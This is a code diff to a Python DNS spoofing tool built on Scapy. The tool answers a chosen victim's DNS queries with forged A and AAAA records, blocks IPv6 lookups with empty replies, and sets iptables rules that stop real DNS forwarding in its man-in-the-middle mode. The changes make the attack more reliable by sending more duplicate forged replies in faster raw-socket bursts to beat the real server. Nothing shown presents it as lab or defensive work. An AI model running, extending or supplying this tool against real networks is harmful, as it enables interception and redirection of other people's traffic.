@@ -12,7 +12,6 @@ Features:
 - iptables rules to block forwarded DNS (ensures MITM mode reliability)
 - DNS forwarding for non-spoofed domains in MITM mode
 """
-
 # mypy: ignore-errors
 from __future__ import annotations
 
@@ -23,9 +22,7 @@ import subprocess
 import threading
 from enum import Enum
 from pathlib import Path
-
 import click
-
 from scapy.all import (  # pylint: disable=no-name-in-module,import-error
     DNS,
     DNSQR,
@@ -39,10 +36,11 @@ from scapy.all import (  # pylint: disable=no-name-in-module,import-error
     raw,
 )
 from scapy.error import Scapy_Exception
+from network_utils import init_raw_socket, send_raw_packet
 
 
 # Number of duplicate spoofed responses to send (helps win race conditions)
-SPOOF_PACKET_COUNT = 3
+SPOOF_PACKET_COUNT = 5
 
 # Upstream DNS server for forwarding non-spoofed queries
 UPSTREAM_DNS = "8.8.8.8"
@@ -56,8 +54,13 @@ class DNSMode(Enum):
     MITM = "mitm"      # ARP-DNS: victim sends DNS directly to us
 
 
-def load_dns_rules(rules_path: str | Path) -> dict[str, str]:
-    """Load DNS spoofing rules from a JSON file."""
+def load_dns_rules(rules_path: str | Path) -> dict[str, dict[str, str]]:
+    """
+    Load DNS spoofing rules from a JSON file.
+    Supports two formats:
+    - Simple: {"domain": "ipv4"} - IPv4 only, AAAA returns empty
+    - Full: {"domain": {"A": "ipv4", "AAAA": "ipv6"}} - Both record types
+    """
     path = Path(rules_path)
     if not path.exists():
         raise FileNotFoundError(f"DNS rules file not found: {path}")
@@ -68,16 +71,26 @@ def load_dns_rules(rules_path: str | Path) -> dict[str, str]:
     if not isinstance(rules, dict):
         raise ValueError("DNS rules must be a JSON object (dict)")
 
-    normalized: dict[str, str] = {}
+    normalized: dict[str, dict[str, str]] = {}
     for key, value in rules.items():
-        if not isinstance(key, str) or not isinstance(value, str):
-            raise ValueError("DNS rules must be a mapping of string domain patterns to string IPs")
-        normalized[key.rstrip(".").lower()] = value
+        domain = key.rstrip(".").lower()
+        
+        if isinstance(value, str):
+            # Simple format: IPv4 only
+            normalized[domain] = {"A": value, "AAAA": None}  # type: ignore
+        elif isinstance(value, dict):
+            # Full format with A and/or AAAA
+            normalized[domain] = {
+                "A": value.get("A"),
+                "AAAA": value.get("AAAA"),
+            }
+        else:
+            raise ValueError(f"Invalid rule format for {key}")
 
     return normalized
 
 
-def match_domain(query_domain: str, rules: dict[str, str]) -> str | None:
+def match_domain(query_domain: str, rules: dict[str, dict[str, str]]) -> dict[str, str] | None:
     """Match a queried domain against DNS rules."""
     query_domain = query_domain.rstrip(".").lower()
 
@@ -86,16 +99,16 @@ def match_domain(query_domain: str, rules: dict[str, str]) -> str | None:
         return rules[query_domain]
 
     # Wildcard match (*.example.com). Also match base domain (example.com).
-    for pattern, ip in rules.items():
+    for pattern, record in rules.items():
         if not pattern.startswith("*."):
             continue
 
         if fnmatch.fnmatch(query_domain, pattern):
-            return ip
+            return record
 
         base_domain = pattern[2:]
         if query_domain == base_domain:
-            return ip
+            return record
 
     return None
 
@@ -111,7 +124,7 @@ class DNSSpoofer:
     def __init__(
         self,
         iface: str,
-        rules: dict[str, str],
+        rules: dict[str, dict[str, str]],
         mode: DNSMode = DNSMode.RACE,
         victim_ip: str | None = None,
         gateway_ip: str | None = None,
@@ -131,6 +144,19 @@ class DNSSpoofer:
         
         # Track if we added iptables rules (for cleanup)
         self._iptables_rules_added = False
+        
+        # Raw socket for faster packet sending
+        self._raw_socket: socket.socket | None = None
+        self._raw_socket = init_raw_socket(iface)
+
+    def _send_burst_async(self, packet_bytes: bytes, count: int) -> None:
+        """Send remaining burst packets in background thread."""
+        def burst():
+            for _ in range(count):
+                send_raw_packet(self._raw_socket, packet_bytes, self.iface)
+        
+        thread = threading.Thread(target=burst, daemon=True)
+        thread.start()
 
     def _setup_iptables(self) -> None:
         """
@@ -224,13 +250,14 @@ class DNSSpoofer:
         except Exception as e:
             click.echo(f"[!] DNS forward error: {e}")
 
-    def _build_dns_response(self, pkt, spoofed_ip: str) -> Ether | None:
+    def _build_dns_response(self, pkt, spoofed_ip: str | None, query_type: int = 1) -> Ether | None:
         """
         Build a spoofed DNS response packet.
 
         Args:
             pkt: Original DNS query packet
-            spoofed_ip: IP address to return in response
+            spoofed_ip: IP address to return in response (IPv4 for A, IPv6 for AAAA)
+            query_type: DNS query type (1=A, 28=AAAA)
 
         Returns:
             Crafted DNS response packet or None on error
@@ -250,21 +277,50 @@ class DNSSpoofer:
             # Build UDP layer (swap ports)
             udp = UDP(sport=53, dport=pkt[UDP].sport)
 
-            # Build DNS response
-            dns = DNS(
-                id=pkt[DNS].id,  # Match query ID
-                qr=1,  # This is a response
-                aa=1,  # Authoritative answer
-                rd=pkt[DNS].rd,  # Copy recursion desired flag
-                ra=1,  # Recursion available
-                qd=pkt[DNS].qd,  # Copy question section
-                an=DNSRR(
-                    rrname=query_name,
-                    type="A",
-                    ttl=300,
-                    rdata=spoofed_ip,
-                ),
-            )
+            # Build DNS response based on query type
+            if query_type == 28:  # AAAA query
+                if spoofed_ip:
+                    # Spoof with provided IPv6 address
+                    dns = DNS(
+                        id=pkt[DNS].id,
+                        qr=1,
+                        aa=1,
+                        rd=pkt[DNS].rd,
+                        ra=1,
+                        qd=pkt[DNS].qd,
+                        an=DNSRR(
+                            rrname=query_name,
+                            type="AAAA",
+                            ttl=300,
+                            rdata=spoofed_ip,
+                        ),
+                    )
+                else:
+                    # Block IPv6: empty response (no answer section)
+                    dns = DNS(
+                        id=pkt[DNS].id,
+                        qr=1,
+                        aa=1,
+                        rd=pkt[DNS].rd,
+                        ra=1,
+                        qd=pkt[DNS].qd,
+                        ancount=0,
+                    )
+            else:  # A query (type 1)
+                dns = DNS(
+                    id=pkt[DNS].id,
+                    qr=1,
+                    aa=1,
+                    rd=pkt[DNS].rd,
+                    ra=1,
+                    qd=pkt[DNS].qd,
+                    an=DNSRR(
+                        rrname=query_name,
+                        type="A",
+                        ttl=300,
+                        rdata=spoofed_ip,
+                    ),
+                )
 
             return eth / ip / udp / dns
 
@@ -292,10 +348,13 @@ class DNSSpoofer:
                 if pkt[IP].src != self.victim_ip:
                     return
 
+            # Get query type (1=A, 28=AAAA, etc.)
+            query_type = pkt[DNSQR].qtype
+            
             # Check if we should spoof this domain
-            spoofed_ip = match_domain(qname, self.rules)
+            dns_records = match_domain(qname, self.rules)
 
-            if spoofed_ip is None:
+            if dns_records is None:
                 # No rule for this domain
                 if self.mode == DNSMode.MITM:
                     # In MITM mode, we blocked forwarding, so we must forward manually
@@ -304,20 +363,39 @@ class DNSSpoofer:
                 # In RACE mode, do nothing - let the real DNS server respond
                 return
 
-            # Build and send spoofed response
-            response = self._build_dns_response(pkt, spoofed_ip)
+            # Get spoofed IP for this query type
+            if query_type == 28:  # AAAA (IPv6)
+                spoofed_ip = dns_records.get("AAAA")
+            elif query_type == 1:  # A (IPv4)
+                spoofed_ip = dns_records.get("A")
+                # If no A record configured, don't respond
+                if not spoofed_ip:
+                    return
+            else:
+                # Ignore other query types (MX, TXT, etc.) - let real DNS handle
+                return
+
+            # Build and send response (spoofed IP or empty for blocking)
+            record_type = "AAAA" if query_type == 28 else "A"
+            response = self._build_dns_response(pkt, spoofed_ip, query_type=query_type)
             if response is None:
                 click.echo(f"[!] Failed to build DNS response for {qname}")
                 return
 
-            # Send the spoofed response multiple times to win race conditions
-            # In MITM mode, one packet is usually enough since we block forwarding
-            # In RACE mode, we send multiple to beat the real DNS server
+            # Send the first packet immediately
             send_count = 1 if self.mode == DNSMode.MITM else SPOOF_PACKET_COUNT
-            for _ in range(send_count):
-                sendp(response, iface=self.iface, verbose=False)
+            response_bytes = raw(response)
+            send_raw_packet(self._raw_socket, response_bytes, self.iface)
+            
+            # Then send remaining packets asynchronously
+            if send_count > 1:
+                self._send_burst_async(response_bytes, send_count - 1)
 
-            click.echo(f"[DNS] Spoofed {qname} → {spoofed_ip} (sent {send_count}x)")
+            # Log action
+            if spoofed_ip:
+                click.echo(f"[DNS] Spoofed {record_type} {qname} -> {spoofed_ip} ({send_count}x)")
+            else:
+                click.echo(f"[DNS] Blocked {record_type} {qname} (empty response)")
 
         except (KeyError, IndexError, AttributeError, TypeError, ValueError, OSError) as e:
             click.echo(f"[!] Error handling DNS packet: {e}")
@@ -374,6 +452,14 @@ class DNSSpoofer:
         
         # Clean up iptables rules
         self._cleanup_iptables()
+        
+        # Close raw socket
+        if self._raw_socket:
+            try:
+                self._raw_socket.close()
+            except OSError:
+                pass
+            self._raw_socket = None
 
     def join(self, timeout: float | None = None) -> None:
         """Wait for the background thread to finish."""
